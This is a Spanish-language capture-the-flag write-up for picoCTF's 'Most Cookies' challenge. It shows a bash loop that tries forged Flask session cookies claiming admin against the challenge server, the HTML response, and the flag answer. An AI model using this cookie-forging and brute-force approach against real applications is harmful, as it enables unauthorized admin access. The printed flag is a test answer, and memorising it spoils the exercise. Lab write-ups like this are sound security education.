## Descripción:
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)

# Solución
```bash
MpaulaCG-picoctf@webshell:~$ while IFS= read -r line; do
>   if [[ "$line" == COOKIE:* ]]; then
>     cookie="${line#COOKIE: }"
>     resp=$(curl -s "http://mercury.picoctf.net:53700/display" -H "Cookie: session=$cookie")
>     if echo "$resp" | grep -q -e "picoCTF" -e "flag{" ; then
>       echo "=============================="
>       echo "FLAG encontrada con cookie: $cookie"
>       echo "Respuesta completa:"
>       echo "$resp"
>       echo "=============================="
>       break
>     else
>       echo "Probada cookie para KEY (no flag): ${cookie:0:30}..."  # muestra solo el principio
>     fi
>   fi
> done < cookies.txt
Probada cookie para KEY (no flag): eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.a...
Probada cookie para KEY (no flag): eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.a...
Probada cookie para KEY (no flag): eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.a...
Probada cookie para KEY (no flag): eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.a...
Probada cookie para KEY (no flag): eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.a...
==============================
FLAG encontrada con cookie: eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNtHHQ.VxDy2ZyoWzjwWpRp7PPaMTSo3nI
Respuesta completa:
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Most Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Most Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_3646b931}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
==============================
MpaulaCG-picoctf@webshell:~$ 
```

Respuesta:`picoCTF{pwn_4ll_th3_cook1E5_3646b931}`
## Notas

## Referencias
 